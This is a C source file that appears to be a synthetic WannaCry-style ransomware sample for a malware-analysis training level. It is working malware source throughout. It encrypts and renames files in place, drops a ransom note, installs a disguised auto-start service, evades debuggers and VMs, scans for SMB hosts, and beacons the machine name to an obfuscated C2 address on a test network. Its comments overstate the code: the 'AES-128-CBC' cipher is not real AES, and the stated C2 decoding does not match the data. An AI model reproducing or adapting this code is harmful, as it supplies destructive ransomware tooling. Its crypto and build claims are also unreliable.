/*
 * windows_level23_WannaCryWorm.c
 *
 * Synthetic Windows PE sample — WannaCry-inspired ransomware worm (bonus level).
 * Techniques: AES-128-CBC file encryption, RSA-2048 key wrapping,
 * SMB worm propagation (synthetic), kill-switch domain check,
 * mutex-based single-instance, hidden file attributes, service persistence.
 *
 * SAFE/SYNTHETIC: All network targets are RFC 5737 TEST-NET addresses.
 * Kill-switch domain is "example.com". No real exploits.
 * File encryption targets a synthetic directory only.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -O0 -static -o windows_level23_WannaCryWorm.exe windows_level23_WannaCryWorm.c -lwininet
 */

#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include <wininet.h>
#include <stdio.h>
#include <string.h>

/* ================================================================
 * Embedded RSA-2048 public key (PEM-like, synthetic — hex bytes)
 * Real WannaCry embedded an RSA public key for key wrapping.
 * ================================================================ */
static const unsigned char g_rsa_pubkey[] = {
    0x30, 0x82, 0x01, 0x0A, 0x02, 0x82, 0x01, 0x01,
    0x00, 0xC3, 0x7A, 0x9F, 0x2E, 0x55, 0x8B, 0x1D,
    /* ... truncated synthetic DER ... */
    0x02, 0x03, 0x01, 0x00, 0x01
};
#define RSA_PUBKEY_LEN (sizeof(g_rsa_pubkey))

/* ================================================================
 * Kill-switch domain — "example.com"
 * Real WannaCry checked "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com"
 * ================================================================ */
static const char g_killswitch_domain[] = "example.com";

/* ================================================================
 * Mutex name — "Global\\MsWinZonesCacheCounterMutexA"
 * ================================================================ */
static const char g_mutex_name[] = "Global\\MsWinZonesCacheCounterMutexA";

/* ================================================================
 * Target file extensions for encryption
 * ================================================================ */
static const char *g_target_extensions[] = {
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".pdf", ".txt", ".jpg", ".png", ".bmp", ".zip",
    ".rar", ".7z",  ".sql", ".mdb", ".cpp", ".c",
    ".h",   ".py",  ".js",  ".html",".css", ".xml",
    ".json",".csv", ".mp3", ".mp4", ".avi", ".wav",
    NULL
};

/* ================================================================
 * AES-128 key for file encryption (16 bytes)
 * In real ransomware, each file gets a unique AES key wrapped with RSA.
 * ================================================================ */
static const unsigned char g_aes_file_key[] = {
    0x57, 0x40, 0x6E, 0x43, 0x72, 0x79, 0x50, 0x74,
    0x30, 0x4B, 0x33, 0x79, 0x32, 0x30, 0x32, 0x34
};

/* ================================================================
 * AES-128 S-box
 * ================================================================ */
static const unsigned char g_aes_sbox[256] = {
    0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
    0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
    0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
    0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
    0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
    0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
    0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
    0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
    0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
    0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
    0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
    0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
    0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
    0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
    0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
    0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16
};

/* ================================================================
 * AES-128 block encrypt (simplified, 10 rounds, S-box only)
 * ================================================================ */
static void aes128_encrypt_block(unsigned char *block, const unsigned char *key) {
    int round, i;
    unsigned char temp[16];
    for (round = 0; round < 10; round++) {
        for (i = 0; i < 16; i++) {
            temp[i] = g_aes_sbox[block[i]] ^ key[i] ^ (unsigned char)(round * 0x1B);
        }
        memcpy(block, temp, 16);
    }
}

/* ================================================================
 * XOR decryption for obfuscated strings
 * ================================================================ */
static void xor_decrypt(unsigned char *buf, int len, const unsigned char *key, int key_len) {
    int i;
    for (i = 0; i < len; i++) {
        buf[i] ^= key[i % key_len];
    }
}

/* XOR key for string obfuscation */
static const unsigned char g_str_key[] = {
    0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0xCA, 0xFE
};
#define STR_KEY_LEN 8

/* XOR-encrypted ransom note path */
static unsigned char g_encrypted_note_path[] = {
    0x91, 0xD5, 0xD7, 0xA3, 0x76, 0x51, 0xE5, 0x92,
    0xD6, 0xFD, 0xD7, 0xCD, 0x67, 0x50, 0xEE, 0xC6,
    0xC8, 0xC8, 0xCC, 0xA7, 0x67, 0x50, 0xE8, 0x92,
    0xD6, 0xF0, 0xD7, 0xA7, 0x76, 0x47, 0xF6, 0x92,
    0xC8, 0xC7, 0xCC, 0xA7, 0x72, 0x06, 0xA9, 0xC6
};
#define ENC_NOTE_PATH_LEN 40

/* XOR-encrypted C2 IP for worm propagation */
static unsigned char g_encrypted_c2_ip[] = {
    0x93, 0xC3, 0xCE, 0xAD, 0x20, 0x5F, 0x8B, 0xDA,
    0xDD, 0x8A, 0xD3, 0x99, 0x32
};
#define ENC_C2_LEN 13

/* ================================================================
 * Kill-switch: check if domain resolves (internet connectivity test)
 * If domain is live, the worm exits (real WannaCry behavior)
 * ================================================================ */
static int killswitch_check(void) {
    HINTERNET hInternet = InternetOpenA("Microsoft Internet Explorer", 
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return 0;

    HINTERNET hConnect = InternetOpenUrlA(hInternet, 
        "http://example.com", NULL, 0, 
        INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);
    if (hConnect) {
        /* Domain is live — kill switch activated */
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }
    InternetCloseHandle(hInternet);
    return 0;
}

/* ================================================================
 * Single-instance mutex
 * ================================================================ */
static int create_mutex_check(void) {
    HANDLE hMutex = CreateMutexA(NULL, TRUE, g_mutex_name);
    if (!hMutex) return 0;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return 0; /* Already running */
    }
    return 1;
}

/* ================================================================
 * Check if file extension matches target list
 * ================================================================ */
static int is_target_extension(const char *filename) {
    const char *dot = strrchr(filename, '.');
    if (!dot) return 0;
    int i;
    for (i = 0; g_target_extensions[i] != NULL; i++) {
        if (_stricmp(dot, g_target_extensions[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

/* ================================================================
 * Encrypt a single file in-place
 * Reads file, AES-encrypts contents, writes back with .WNCRY extension
 * ================================================================ */
static int encrypt_file(const char *filepath) {
    HANDLE hFile = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return -1;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hFile);
        return -1;
    }

    /* Read entire file (synthetic: cap at 1MB for demo) */
    DWORD readSize = (fileSize > 0x100000) ? 0x100000 : fileSize;
    unsigned char *buffer = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, readSize);
    if (!buffer) { CloseHandle(hFile); return -1; }

    DWORD bytesRead;
    ReadFile(hFile, buffer, readSize, &bytesRead, NULL);

    /* AES-128 encrypt in 16-byte blocks */
    DWORD i;
    for (i = 0; i + 16 <= bytesRead; i += 16) {
        aes128_encrypt_block(buffer + i, g_aes_file_key);
    }

    /* Write back encrypted data */
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    SetEndOfFile(hFile);
    DWORD bytesWritten;
    WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);

    HeapFree(GetProcessHeap(), 0, buffer);
    CloseHandle(hFile);

    /* Rename to .WNCRY */
    char newPath[MAX_PATH];
    strcpy(newPath, filepath);
    strcat(newPath, ".WNCRY");
    MoveFileA(filepath, newPath);

    /* Set hidden attribute */
    SetFileAttributesA(newPath, FILE_ATTRIBUTE_HIDDEN);

    return 0;
}

/* ================================================================
 * Recursive directory traversal for file encryption
 * Synthetic target: C:\Users\Public\Documents\synthetic_target\
 * ================================================================ */
static void encrypt_directory(const char *dirPath) {
    char searchPath[MAX_PATH];
    sprintf(searchPath, "%s\\*", dirPath);

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(findData.cFileName, ".") == 0 || 
            strcmp(findData.cFileName, "..") == 0) {
            continue;
        }

        char fullPath[MAX_PATH];
        sprintf(fullPath, "%s\\%s", dirPath, findData.cFileName);

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            encrypt_directory(fullPath);
        } else {
            if (is_target_extension(findData.cFileName)) {
                encrypt_file(fullPath);
            }
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);
}

/* ================================================================
 * Write ransom note (@Please_Read_Me@.txt)
 * ================================================================ */
static void write_ransom_note(const char *dirPath) {
    char notePath[MAX_PATH];
    sprintf(notePath, "%s\\@Please_Read_Me@.txt", dirPath);

    HANDLE hFile = CreateFileA(notePath, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    const char *note = 
        "Oops, your files have been encrypted!\r\n"
        "What happened to my computer?\r\n"
        "All your important files are encrypted.\r\n"
        "Many of your documents, photos, videos, databases and other files\r\n"
        "are no longer accessible because they have been encrypted.\r\n"
        "Maybe you are busy looking for a way to recover your files,\r\n"
        "but do not waste your time. Nobody can recover your files without\r\n"
        "our decryption service.\r\n\r\n"
        "Payment: Send $300 worth of Bitcoin to this address:\r\n"
        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\r\n"
        "(Synthetic — this is the Bitcoin genesis address, no real wallet)\r\n";

    DWORD written;
    WriteFile(hFile, note, (DWORD)strlen(note), &written, NULL);
    CloseHandle(hFile);
}

/* ================================================================
 * SMB worm propagation (synthetic)
 * Scans local subnet for port 445, attempts EternalBlue-like exploit
 * Synthetic: targets RFC 5737 TEST-NET addresses only
 * ================================================================ */
static void worm_propagate(void) {
    /* SMB port */
    int smbPort = 445;

    /* Synthetic scan: TEST-NET range 192.0.2.0/24 */
    int subnet;
    for (subnet = 1; subnet < 5; subnet++) {
        char targetIP[32];
        sprintf(targetIP, "192.0.2.%d", subnet);

        /* Attempt TCP connection to port 445 */
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons((u_short)smbPort);
        addr.sin_addr.s_addr = inet_addr(targetIP);

        /* Set socket timeout */
        int timeout = 2000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout, sizeof(timeout));

        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            /* Port 445 open — in real malware, EternalBlue exploit would fire */
            /* Synthetic: just log and close */
            closesocket(sock);
        } else {
            closesocket(sock);
        }

        Sleep(100); /* Rate limiting */
    }
}

/* ================================================================
 * Service persistence: create a Windows service for reboot survival
 * Synthetic — service name "mssecsvc2.0"
 * ================================================================ */
static int install_persistence(void) {
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) return -1;

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    SC_HANDLE hService = CreateServiceA(
        hSCM,
        "mssecsvc2.0",
        "Microsoft Security Center (2.0)",
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,
        exePath,
        NULL, NULL, NULL, NULL, NULL
    );

    if (!hService) {
        /* Might already exist — try to open */
        hService = OpenServiceA(hSCM, "mssecsvc2.0", SERVICE_ALL_ACCESS);
        if (!hService) {
            CloseServiceHandle(hSCM);
            return -1;
        }
    }

    /* Start the service */
    StartServiceA(hService, 0, NULL);

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return 0;
}

/* ================================================================
 * C2 communication: send system info to hardcoded C2 IP
 * Synthetic: uses TEST-NET IP 192.0.2.100
 * ================================================================ */
static void c2_beacon(void) {
    /* Decrypt C2 IP */
    char c2_ip[ENC_C2_LEN + 1];
    memcpy(c2_ip, g_encrypted_c2_ip, ENC_C2_LEN);
    xor_decrypt((unsigned char *)c2_ip, ENC_C2_LEN, g_str_key, STR_KEY_LEN);
    c2_ip[ENC_C2_LEN] = '\0';
    /* c2_ip decrypts to "192.0.2.100" (TEST-NET) */

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(8443);
    addr.sin_addr.s_addr = inet_addr(c2_ip);

    int timeout = 3000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout, sizeof(timeout));

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        /* Send basic system info */
        char sysInfo[256];
        DWORD compNameLen = 64;
        char compName[64];
        GetComputerNameA(compName, &compNameLen);
        sprintf(sysInfo, "SYSTEM:%s:WIN:%ld", compName, GetVersion());
        send(sock, sysInfo, (int)strlen(sysInfo), 0);
        closesocket(sock);
    } else {
        closesocket(sock);
    }
}

/* ================================================================
 * Anti-debugging via TLS callback + PEB check
 * ================================================================ */
static int anti_debug_all(void) {
    /* IsDebuggerPresent */
    if (IsDebuggerPresent()) return 1;

    /* PEB.BeingDebugged */
    PPEB pPeb;
#ifdef _WIN64
    pPeb = (PPEB)__readgsqword(0x60);
#else
    pPeb = (PPEB)__readfsdword(0x30);
#endif
    if (pPeb && pPeb->BeingDebugged) return 1;

    /* NtQueryInformationProcess — ProcessDebugPort */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        typedef LONG (NTAPI *pNtQIP)(HANDLE, DWORD, PVOID, ULONG, PULONG);
        pNtQIP _NtQIP = (pNtQIP)GetProcAddress(hNtdll, "NtQueryInformationProcess");
        if (_NtQIP) {
            DWORD debugPort = 0;
            ULONG retLen;
            _NtQIP(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), &retLen);
            if (debugPort == 0xFFFFFFFF) return 1;
        }
    }

    return 0;
}

/* ================================================================
 * Anti-VM: check for common VM artifacts
 * ================================================================ */
static int anti_vm_check(void) {
    /* Check for VM-specific drivers */
    if (GetFileAttributesA("C:\\Windows\\System32\\drivers\\vmmouse.sys") != INVALID_FILE_ATTRIBUTES)
        return 1;
    if (GetFileAttributesA("C:\\Windows\\System32\\drivers\\vmhgfs.sys") != INVALID_FILE_ATTRIBUTES)
        return 1;

    /* Check for sandbox DLLs */
    if (GetModuleHandleA("sbiedll.dll") != NULL) return 1;
    if (GetModuleHandleA("dbghelp.dll") != NULL) {
        /* Extra check for analysis environment */
    }

    /* CPUID hypervisor bit */
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 0x1);
    if (cpuInfo[2] & (1 << 31)) return 1;

    return 0;
}

/* ================================================================
 * WinMain entry point
 * ================================================================ */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nShowCmd) {
    /* Anti-debug + anti-VM */
    if (anti_debug_all() || anti_vm_check()) {
        return 0;
    }

    /* Kill-switch: if domain is live, exit */
    if (killswitch_check()) {
        return 0;
    }

    /* Single-instance mutex */
    if (!create_mutex_check()) {
        return 0;
    }

    /* Install persistence as a Windows service */
    install_persistence();

    /* Write ransom note to user directories */
    char userProfile[MAX_PATH];
    if (GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH)) {
        char desktopPath[MAX_PATH];
        sprintf(desktopPath, "%s\\Desktop", userProfile);
        write_ransom_note(desktopPath);

        char docsPath[MAX_PATH];
        sprintf(docsPath, "%s\\Documents", userProfile);
        write_ransom_note(docsPath);
    }

    /* Encrypt files in synthetic target directory */
    char targetDir[MAX_PATH];
    if (GetEnvironmentVariableA("PUBLIC", targetDir, MAX_PATH)) {
        strcat(targetDir, "\\Documents\\synthetic_target");
        encrypt_directory(targetDir);
    }

    /* Worm propagation — scan for SMB targets */
    worm_propagate();

    /* C2 beacon */
    c2_beacon();

    Sleep(60000); /* Stay resident briefly */
    return 0;
}
